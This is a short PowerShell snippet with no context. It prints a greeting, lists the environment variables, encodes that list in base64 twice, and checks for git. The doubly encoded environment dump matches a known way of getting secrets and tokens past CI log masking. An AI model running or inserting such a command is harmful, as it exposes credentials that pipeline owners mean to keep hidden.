Write-Host "hello"

gci env:


[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($(gci env: | out-string)))))

which git


